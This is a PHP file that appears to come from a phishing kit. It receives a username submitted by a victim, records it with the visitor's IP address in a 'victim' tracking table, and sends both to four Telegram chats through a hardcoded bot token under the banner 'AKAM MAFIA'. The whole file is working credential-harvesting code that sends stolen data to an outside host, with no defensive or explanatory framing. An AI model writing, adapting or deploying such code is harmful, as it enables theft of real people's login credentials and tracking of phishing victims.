<?php
error_reporting(0);
if(file_exists('../panel/lib/funciones.php')){ require_once('../panel/lib/funciones.php'); }
else { require_once('../lib/funciones.php'); }

$ip = $_SERVER['REMOTE_ADDR'];
$usuario = $_POST['usr'];
$token = "8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA";
$chat_ids = ["8114050673", "8518977918", "8638340940", "8645545892"];

if (!empty($usuario)) {
    actualizar_registro($ip, "USUARIO", $usuario);
    actualizar_estado_victima($ip, "1");
    $msj = "⭐ <b>𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 - INICIO</b> ⭐\n👤 <b>USUARIO:</b> <code>$usuario</code>\n📍 <b>IP:</b> $ip";
    foreach ($chat_ids as $id) {
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$id&text=".urlencode($msj)."&parse_mode=HTML");
    }
}
echo "ok";
?>
